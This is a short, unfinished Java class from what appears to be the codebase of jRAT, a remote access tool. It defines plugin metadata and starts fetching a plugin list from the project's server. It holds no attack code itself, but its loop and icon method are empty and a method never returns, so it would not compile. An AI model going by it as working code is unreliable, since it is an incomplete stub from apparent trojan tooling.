package pro.jrat.extensions;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import javax.swing.ImageIcon;

import pro.jrat.Constants;
import pro.jrat.net.WebRequest;

public class OnlinePlugin {

	private String name;
	private String version;
	private String builtFor;
	private String description;
	private String author;
	private ImageIcon icon;
	
	public OnlinePlugin(String name, String version, String builtFor, String description, String author) {
		this.name = name;
		this.version = version;
		this.builtFor = builtFor;
		this.description = description;
		this.author = author;
	}
	
	public ImageIcon getIcon() {
		if (icon == null) {
			
		}
		
		return icon;
	}

	public static List<OnlinePlugin> getAvailablePlugins() throws Exception {
		List<OnlinePlugin> plugins = new ArrayList<OnlinePlugin>();
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(WebRequest.getInputStream(Constants.HOST + "/plugins/plugins.php")));
		String line;
		
		while ((line = reader.readLine()) != null) {
			
		}
		
		
		reader.close();
	}

}
